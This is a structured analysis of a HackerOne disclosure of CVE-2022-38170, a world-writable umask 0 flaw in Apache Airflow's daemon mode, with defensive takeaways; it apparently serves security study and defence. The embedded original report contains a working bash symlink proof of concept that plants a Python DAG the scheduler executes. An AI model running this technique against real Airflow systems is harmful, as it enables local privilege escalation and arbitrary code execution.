# Apache Airflow Daemon Mode Insecure Umask Privilege Escalation

## Metadata
- **Source:** HackerOne
- **Report:** 1690093 | https://hackerone.com/reports/1690093
- **Submitted:** 2022-09-02
- **Reporter:** nyymi
- **Program:** Apache Airflow
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Insecure File Permissions, Privilege Escalation, Arbitrary Code Execution, Symlink Attack
- **CVEs:** CVE-2022-38170
- **Category:** memory-binary

## Summary
Apache Airflow prior to version 2.3.4 uses an insecure umask of 0 in daemon mode, making critical files and directories world-writable. An unprivileged local attacker can leverage symlink attacks and log file manipulation to inject malicious DAG code that gets executed by the Airflow scheduler process, achieving privilege escalation to the Airflow user's privileges.

## Attack scenario
1. Attacker identifies writable Airflow scheduler log directories due to umask 0 permissions
2. Attacker creates a symlink from a log file to a DAG configuration file in the Airflow dags directory
3. When the scheduler rotates logs, the symlink causes the attacker-controlled content to overwrite the target log file location
4. Attacker injects malicious Python code into the target DAG file that will be parsed by Airflow
5. Scheduler restarts or reloads DAGs and executes the injected malicious code with scheduler process privileges
6. Attacker achieves code execution as the Airflow daemon user, potentially escalating to root if Airflow runs with elevated privileges

## Root cause
The Airflow daemon sets umask(0) during startup, resulting in files created with default permissions (666 for files, 777 for directories), making them world-readable and world-writable. This insecure default combined with Airflow's dynamic DAG parsing allows local privilege escalation.

## Attacker mindset
A local unprivileged user seeking to escape their restricted environment and gain higher privileges. The attacker exploits trust in file system permissions and the automatic DAG execution model. This is a low-effort attack requiring only shell access and knowledge of Airflow's directory structure.

## Defensive takeaways
- Always set appropriate umask values in daemon processes (typically 0077 or 0027 instead of 0)
- Implement strict file permission checks for sensitive directories (logs, DAGs, configurations)
- Use secure file operations that explicitly set permissions rather than relying on umask
- Validate and sanitize DAG file paths to prevent symlink-based attacks
- Run daemons with minimal required privileges, never as root if possible
- Implement file integrity monitoring on critical application directories
- Restrict local filesystem access through SELinux, AppArmor, or containerization
- Regularly audit file permissions in application directories

## Variant hunting
Search for similar umask(0) patterns in other Python daemons and services. Check for other Airflow components that may have inherited insecure permissions (webserver, triggerer, worker). Look for TOCTOU race conditions in file operations. Investigate other symlink-vulnerable log rotation mechanisms in daemon applications.

## MITRE ATT&CK
- T1548.001
- T1134.003
- T1546.015
- T1098.002
- T1197

## Notes
CWE-277 (Insecure Inherited Permissions). The vulnerability affects the scheduler component particularly but likely impacts other daemon components. The fix required explicit umask(0o0077) calls instead of umask(0). This is a straightforward but critical privilege escalation due to improper permission handling in a process that parses and executes user-supplied code (DAGs).

## Full report
<details><summary>Expand</summary>

Apache Airflow prior to 2.3.4 had multiple components with an insecure daemon umask of 0, resulting in critical files and directories to be world writable. As such, any local user can infer Airflow to process specially crafted input and ultimately perform a privilege escalation to user executing Airflow. In particular the scheduler component is exploitable.

This is CWE-277: Insecure Inherited Permissions

The vulnerability and fix was announced as https://www.openwall.com/lists/oss-security/2022/09/02/3

# Proof of concept

The following attack works against the demo installation of Apache Airflow (when `airflow scheduler` is run with the `--daemon` flag):
```
#!/bin/bash
TARGET=/home/airflow
umask 0
cd $TARGET/logs/scheduler/latest/native_dags/example_dags
rm example_bash_operator.py.log
ln -s $TARGET/dags/poc.py example_bash_operator.py.log
until [ -f $TARGET/dags/poc.py ]
do
  sleep 1
done
rm example_bash_operator.py.log
(cat <<'EOF'
import os
os.system("id >>/tmp/pwned")
from airflow import DAG
EOF
) > $TARGET/dags/poc.py
```
The injected DAG payload (code execution) is triggered when the Airflow scheduler is restarted. This simple PoC performs a full arbitrary code execution, but other means of gaining control via custom DAGs exist as well.

## Impact

Privilege escalation: loss of confidentiality, integrity and availability

</details>

---
*Analysed by Claude on 2026-05-24*
